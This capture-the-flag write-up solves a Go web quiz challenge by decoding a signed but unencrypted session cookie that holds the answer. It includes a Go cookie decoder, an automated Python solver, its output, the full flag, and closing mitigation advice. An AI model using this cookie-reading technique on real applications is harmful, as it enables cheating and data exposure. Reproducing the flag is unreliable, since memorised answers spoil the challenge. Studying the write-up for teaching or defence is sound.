# Firebird Chan's Fanclub 2 - Writeup

## Challenge Overview

**Category:** Web Exploitation
**Difficulty:** Medium
**Objective:** Recover the flag by passing a 20-question quiz.

The quiz presents a question with multiple-choice answers. Submitting a wrong answer or failing to answer all 20 questions correctly results in failure.

## Reconnaissance

### Analyzing the Source Code

The application is built with Go, using the Echo framework and Gorilla Sessions for cookie management.

**Key files identified:**

- `files/website/internal/quiz/service.go`: Handles quiz logic.
- `files/website/internal/quiz/controller.go`: Handles HTTP requests for the quiz.
- `files/website/internal/router/router.go`: Sets up the session store.

**Session Store Initialization (`router.go`):**

```go
secret := make([]byte, 32)
_, err := rand.Read(secret)
e.Use(session.Middleware(sessions.NewCookieStore(secret)))
```

A random 32-byte key is generated at startup to sign cookies. This makes it **impossible to forge cookies** without knowing the key.

**Quiz Logic (`service.go`):**

```go
func (s *Service) UpdateSessionData(correct bool, newQuestion QuestionResponse, session *SessionData) error {
    session.Question = newQuestion.Question
    session.QuestionNum++
    funNumber, err := RandomIntGenerator(20) // Random [0-19]
    if err != nil {
        return err
    }
    session.Answer = (newQuestion.Answer + funNumber) % 20 // Obfuscated answer
    if correct {
        session.Score++
    }
    return nil
}
```

**Critical Vulnerability:** The `Answer` is calculated as `(trueAnswer + randomNumber) % 20` and stored directly in the session state.

**Cookie Structure (`controller.go`):**

```go
// When answering...
sessionRequest.Values["answer"] = sessionData.Answer
if err := sessionRequest.Save(ctx.Request(), ctx.Response()); err != nil { ... }
```

The `answer` is stored in the client-side cookie using `gorilla/sessions`.

## The Vulnerability

While the cookie is cryptographically signed (preventing forgery), its contents are **readable** by the client. The session cookie contains a serialized map (using GOB encoding) of the user's state, including the obfuscated answer.

Because the server pre-calculates the answer for the *next* question and stores it in the cookie, the correct answer for the *current* question is present in the cookie **before** the user submits their answer.

## Exploitation

### Step 1: Cookie Decoding

The session cookie is structured as `timestamp|base64_payload|signature`. We only care about the base64 payload.

1.  **Base64 Decode:** The payload is Base64 encoded (with variations in padding/characters).
2.  **GOB Decode:** The decoded payload is a serialized Go map (`map[interface{}]interface{}`).
3.  **Extract Answer:** The map contains a key `answer` with the correct integer.

**Go Decoder (`temp_decoder_debug.go`):**

```go
func safeDecode(s string) ([]byte, error) {
    s = strings.TrimSpace(s)
    // Fix padding
    if len(s)%4 != 0 {
        s += strings.Repeat("=", 4-len(s)%4)
    }
    // Try URL Encoding first
    data, err := base64.URLEncoding.DecodeString(s)
    if err == nil {
        return data, nil
    }
    // Fallback to Standard Encoding
    data, err = base64.StdEncoding.DecodeString(s)
    // ...
    return data, err
}

// In main():
decodedBytes, _ := safeDecode(cookieValue)
decodedStr := string(decodedBytes)
parts := strings.Split(decodedStr, "|")
gobData := parts[1]
gobBytes, _ := safeDecode(gobData)
// Decode GOB and extract "answer"...
```

### Step 2: Automated Solver

The Python script automates the attack:

1.  **Authenticate:** Register and login to get a fresh session.
2.  **Loop 20 times:**
    *   Get the `session` cookie.
    *   Pass the cookie to the Go decoder to get the integer answer.
    *   Submit the answer to `/v1/quiz/check-answer`.
3.  **Claim Flag:** Once the score reaches 20, fetch `/flag`.

**Python Solver (`solve_final_v11.py` snippet):**

```python
def solve_quiz(s):
    for i in range(21):
        cookie_val = s.cookies.get("session")
        answer = decode_cookie(cookie_val) # Calls the Go decoder

        print(f"[*] Question {i + 1} answer from cookie: {answer}")

        # Submit the pre-calculated answer
        r = s.post(f"{URL}/v1/quiz/check-answer", json={"answer": answer})

        # Check flag
        if i >= 19:
            r = s.get(f"{URL}/flag")
            if "firebird{" in r.text:
                print(r.text)
                return
```

## The Solution

Running the solver successfully answers all 20 questions and retrieves the flag:

```
[*] Question 20 answer from cookie: 4
[+] Answer correct! {'success': 'answer checked'}
[+] Flag found!

<!doctype html>
...
<h1>Your score: 20</h1>
<h2>firebird{i_c4n7_b3li3v3_y0u_r3us3d_my_s35510n_c00k13_t0_ch34t_:(}</h2>
```

**Flag:** `firebird{i_c4n7_b3li3v3_y0u_r3us3d_my_s35510n_c00k13_t0_ch34t_:(}`

The flag jokes about the fact that the user is forced to "cheat" by reading the cookie because the true answer is obfuscated with a random number that only exists in the session state.

## Mitigation

**Primary Issue:** Storing sensitive game state (answers) in client-side cookies, even if signed.

**Recommendations:**

1.  **Server-Side Sessions:** Store the quiz state (`questionNum`, `score`, `currentAnswer`) in a server-side cache (Redis, Memcached) or database. Only send a session ID to the client.
2.  **Answer Verification:** Do not send the answer to the client at all. When the user submits an answer, validate it against the database on the server side.
3.  **Obfuscation:** If client-side state is unavoidable, use server-signed cookies with authenticated encryption (AES-GCM) instead of just signing (HMAC), ensuring confidentiality as well as integrity.
